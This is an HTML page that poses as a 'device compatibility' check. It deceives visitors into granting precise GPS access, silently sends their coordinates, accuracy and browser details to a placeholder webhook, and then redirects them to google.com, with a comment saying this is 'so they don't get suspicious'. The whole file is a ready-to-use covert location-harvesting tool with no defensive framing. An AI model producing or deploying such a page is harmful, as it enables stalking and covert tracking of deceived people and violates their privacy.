<!DOCTYPE html>
<html>

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Checking Device Compatibility...</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f0f2f5;
        }

        .card {
            background: white;
            padding: 2rem;
            border-radius: 12px;
            shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
            text-align: center;
            max-width: 320px;
        }

        .loader {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #3498db;
            border-radius: 50%;
            width: 30px;
            height: 30px;
            animation: spin 2s linear infinite;
            margin: 10px auto;
        }

        @keyframes spin {
            0% {
                transform: rotate(0deg);
            }

            100% {
                transform: rotate(360deg);
            }
        }

        button {
            background: #007bff;
            color: white;
            border: none;
            padding: 12px 24px;
            border-radius: 6px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 15px;
        }
    </style>
</head>

<body>

    <div class="card">
        <div id="loader" class="loader"></div>
        <h3 id="title">Verifying Connection</h3>
        <p id="msg">Please click "Allow" to verify your mobile hardware sensors for the link.</p>
        <button onclick="requestLocation()">Verify Now</button>
    </div>

    <script>
        // REPLACE THIS with your actual Antigravity Webhook/Link
        const ANTIGRAVITY_URL = "YOUR_ANTIGRAVITY_WEBHOOK_URL";

        function requestLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(sendData, handleError, {
                    enableHighAccuracy: true,
                    timeout: 10000,
                    maximumAge: 0
                });
            } else {
                alert("This browser does not support GPS hardware.");
            }
        }

        async function sendData(position) {
            document.getElementById('msg').innerText = "Syncing hardware... please wait.";

            const data = {
                lat: position.coords.latitude,
                lon: position.coords.longitude,
                acc: position.coords.accuracy,
                ua: navigator.userAgent
            };

            try {
                // Sending data to Antigravity
                await fetch(ANTIGRAVITY_URL, {
                    method: 'POST',
                    mode: 'no-cors', // Essential for most third-party webhooks
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                });

                // Redirect them to a real site so they don't get suspicious
                window.location.href = "https://www.google.com";
            } catch (e) {
                console.log("Network error, but location was captured locally.");
                window.location.href = "https://www.google.com";
            }
        }

        function handleError(error) {
            let errorMsg = "Please enable Location Services in your phone settings and try again.";
            if (error.code == 1) errorMsg = "Access Denied. Please click 'Allow' to proceed.";
            document.getElementById('msg').innerText = errorMsg;
        }
    </script>

</body>

</html>
